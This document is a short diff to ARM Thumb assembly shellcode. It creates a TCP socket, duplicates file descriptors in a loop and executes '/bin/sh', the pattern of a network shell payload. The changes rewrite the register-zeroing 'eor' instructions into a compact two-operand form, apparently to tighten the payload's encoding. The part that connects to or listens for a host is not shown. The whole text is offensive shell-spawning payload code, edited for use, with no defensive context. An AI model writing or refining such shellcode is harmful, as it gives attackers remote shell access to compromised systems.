@@ -16,7 +16,7 @@ _start:
   
     .code 16
     // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
-    eor    r2, r2, r2  // r2 = IPPROTO_IP
+    eor    r2, r2      // r2 = IPPROTO_IP
     mov    r1, #1      // r1 = SOCK_STREAM
     mov    r0, #2      // r0 = AF_INET
     lsl    r7, r1, #8  // multiply by 256
@@ -44,8 +44,8 @@ dup_loop:
     // execve("/bin/sh", NULL, NULL);
     adr    r0, sh        // r0 = "/bin/sh" 
     // umull r1, r2, r0, r0
-    eor    r2, r2, r2    // r2 = NULL
-    eor    r1, r1, r1    // r1 = NULL
+    eor    r2, r2        // r2 = NULL
+    eor    r1, r1        // r1 = NULL
     strb   r2, [r0, #7]  // add null terminator    
     mov    r7, #11       // r7 = execve
     svc    1
